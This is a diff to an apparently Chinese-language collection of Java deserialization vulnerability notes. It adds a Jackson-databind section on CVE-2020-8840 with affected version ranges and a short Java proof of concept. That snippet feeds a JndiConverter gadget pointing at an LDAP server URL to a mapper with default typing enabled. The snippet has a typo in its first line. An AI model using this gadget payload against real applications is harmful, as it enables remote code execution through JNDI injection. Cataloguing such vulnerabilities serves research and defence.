@@ -9,6 +9,7 @@
 
 - [Shiro](#Shiro)
 
+- [Jackson-databind](#Jackson-databind)
   
 
 ## Fastjson
@@ -68,6 +69,26 @@ LDAP的利用方式要优于RMI, 且LDAP可以直接返回序列化对象, 绕�
 ## Apache-poi
 
 ## Shiro
+
+## Jackson-databind
+
+#### CVE=2020-8840
+
+影响范围：2.0.0 <= FasterXML jackson-databind <= 2.9.10.2
+
+不受影响版本：2.8.11.5 、 2.9.10.3
+
+```
+bjectMapper mapper = new ObjectMapper();
+mapper.enableDefaultTyping();
+String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1389/ExportObject\"}]";
+try {
+    mapper.readValue(json, Object.class);
+} catch (IOException e) {
+    e.printStackTrace();
+}
+```
+
 
 
 ## 声明
